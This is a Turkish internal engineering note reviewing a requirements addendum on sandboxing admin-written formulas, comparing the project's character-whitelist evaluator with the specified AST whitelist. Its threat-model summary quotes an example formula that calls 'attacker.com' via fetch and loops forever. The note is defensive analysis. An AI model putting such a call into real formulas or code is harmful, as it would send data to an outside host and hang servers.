# 0027 — BRD okuma turu **9**: Addendum H5.1 (formül sandbox) — [[T-155]] çözüldü

- **Tarih:** 2026-08-10
- **Task:** [[T-143]] — salt-okunur.
- **Kaynak:** `docs/brd/02_Addendum/BRD_Addendum_Technical_Clarifications.md` H5 (677–810)
- **Ölçüm ortamı:** meta `2897e17` · backend `99ee9e6`

---

## 0. Okundu / okunmadı

✅ H5 Problem Statement + **Action 5.1** (677–810)
⛔ **H4** Baseline (534–677) · H5 **5.2/5.3** (810–959) · Sprint 0 Checklist · Phase 2 Gate ·
Escalation (1017–1153)

**Addendum toplam: ~620 / 1153 (%54).** H4 ↔ [[T-024]] denetimi **hâlâ yapılmadı**.

---

## 1. ✅ [[T-155]] ÇÖZÜLDÜ — H5.4 bir mimari emir değil, **dördüncü savunma katmanı**

### 1.1 H5'in gerçek yapısı

**Problem Statement:** *"**Server-side** formula execution = arbitrary code execution. No
validation, timeout, or sandboxing specified."* Tehdit modeli: ele geçirilmiş admin hesabı
`fetch('https://attacker.com', …)` + `while(true){}` yazar.

**Dört Action, sırayla:**

| # | ne | nerede çalışır |
|---|---|---|
| **5.1** | **Formül sandbox'ı** — AST beyaz listesi (`acorn`), fonksiyon/döngü/keyfi erişim yasak | **sunucu** |
| 5.2 | Kaydetme anında doğrulama | sunucu |
| 5.3 | Formül değişikliklerinin audit log'u | sunucu |
| 5.4 | *"Client-Side Execution (Not Server-Side)"* | istemci |

> **5.1 birincil çözümdür ve sunucu tarafıdır.** `SafeFormulaEngine.executeFormula()` AST
> doğrulamasından sonra **sunucuda** çalışır. 5.4 son sıradaki **derinlemesine savunma
> tercihi**, mimarinin kendisi değil.

### 1.2 Üç kanıt aynı yöne

| kanıt | ne diyor |
|---|---|
| **H5.1** (bu tur) | sandbox **sunucuda**; 5.4 dört katmandan biri |
| **H1** Action 1.1 (turu 8) | `includeNetworkLatency: true` · *"Client → **Server** → Client"* — istemcide koşsa ağ gecikmesi ölçmenin anlamı olmazdı |
| `03_Candidate_Log` **CANDIDATE-002** | *"KPI Formula Execution Sandbox"* → **Phase 2** |

**Sonuç:** H5.4 bugün **bağlayıcı bir mimari emir değildir.** CLAUDE.md §2.3'ün
*"frontend sadece sonucu render eder"* cümlesi ve ADR 0007 Karar 1'in Alan B tanımı
**ayakta kalır.**

⚠️ Ve `docs/analysis/0011 §S2.3`'ün açık bıraktığı soru (`PlanningGridEnhanced`'in istemci
hesabı) **bu turla kapanmıyor** — H5.4 onu meşrulaştırmıyor; o hesap hâlâ §2.3'e aykırı ve
ayrı bir karar konusu.

> **[[T-155]] `blocked` → `done`.** Üç ön koşulundan ikisi bu turda ölçüldü; üçüncüsü
> ([[T-159]], paket içi öncelik) **ayrı bir soru olarak açık kalıyor** — ama T-155'in
> cevabı artık ona bağlı değil.

---

## 2. Bizim motorumuz ↔ H5.1 — ölçüm

### 2.1 Nasıl çalışıyor

`formula-parser.service.ts` `safeEval`:

```ts
const sanitized = expression.replace(/\s/g, '');
if (!/^[0-9+\-*/().]+$/.test(sanitized)) { … }        // ← KARAKTER beyaz listesi
const fn = new Function(`"use strict"; return (${sanitized});`);
```

Değişkenler **önce** değerleriyle değiştiriliyor; `new Function`'a ulaşan dizede **hiçbir
harf, tırnak, köşeli parantez, virgül veya noktalı virgül olamaz.**

`mechanic.service.ts` `evaluateFormula` **aynı korumayı** taşıyor
(`/^[0-9+\-*/().\s]+$/`), ve canlı: `POST /mechanics/validate-formula`.

### 2.2 🔒 Güvenlik: bizimki **daha kısıtlayıcı**

H5'in tehdit örnekleri bizim filtremize **takılır** — `fetch`, `while`, `function`, `(` ile
başlayan IIFE'ler hepsi harf içerir.

| | BRD 5.1 | bizde |
|---|---|---|
| yöntem | **AST** beyaz listesi (`acorn`) | **karakter** beyaz listesi |
| `fetch(…)` · `while(true)` · IIFE | AST reddeder | **karakter sınıfı reddeder** |
| bağımlılık | `acorn` + `acorn-walk` | **yok** |

> Bizimki dar ve mekanizması basit; **H5'in tehdit modelini kapatıyor.** Bu, kaynağın
> emrettiği korumanın **farklı ama yeterli** bir uygulaması.

⚠️ *"Yeterli"* iddiası bu turda **tehdit örnekleri üzerinden** kuruldu, kapsamlı bir güvenlik
denetimiyle değil. Kayda geçer.

### 2.3 🔴 Ama **yetenek** boşluğu var — ve BRD'nin kendi beyaz listesi kullanılamıyor

H5.1 sekiz fonksiyona **açıkça izin veriyor**:

```
Math.abs · Math.round · Math.floor · Math.ceil · Math.min · Math.max · Math.sqrt · Math.pow
```

**Karakter beyaz listemizde harf yok** → `Math.round(X/Y)` yazan bir admin
*"Formula contains invalid characters"* alır.

> **BRD'nin izin verdiği sekiz fonksiyonun hiçbiri bizim motorda yazılamıyor.**
> Bu bir güvenlik açığı değil, bir **yetenek eksiği** — ve *"KPI/ROI = Admin tanımlı dinamik
> formül"* ilkesinin (§2.3) pratikteki sınırı.

Ve ADR 0007 Karar 6'nın *"yuvarlama yalnız kalıcılaştırma anında, tek yardımcıdan"* kuralıyla
kesişiyor: bir admin formülde yuvarlama yazamıyor — **bu bilinçli olabilir**, ama hiçbir
yerde yazılı değil. → [[T-160]]

### 2.4 🟡 §7 — aynı yetenek **iki kez** yazılmış

| | dosya | durum |
|---|---|---|
| 1 | `formula-parser.service.ts` `safeEval` | KPI motoru, canlı |
| 2 | `mechanic.service.ts` `evaluateFormula` | `POST /mechanics/validate-formula`, canlı |

İkincisinin **kendi yorumu**: *"Very basic formula evaluation … **This is a simplified
placeholder implementation** … In production, use math.js"*.

İki canlı rota, iki ayrı değerlendirici, biri kendini *"placeholder"* ilan ediyor.
CLAUDE.md §7'nin konusu. → [[T-160]]

---

## 3. Çıktı 3 — danışman kuyruğu

Bu turdan **yeni domain sorusu çıkmadı.** H5 teknik/güvenlik alanında; kararları ölçülebilir.

Kuyruk ~9-10'da sabit.

---

## 4. Sonraki tur

1. **H4** Baseline ↔ [[T-024]] — **dördüncü ve son dayanak denetimi**
2. H5 **5.2/5.3** — kaydetme anında doğrulama + formül değişikliği audit'i
3. Sprint 0 Checklist · Phase 2 Gate · Escalation Policy
4. `Section_05` (2013) · `Section_02` (1026) · `Section_10/11` (niyet ayrımının planning tarafı)
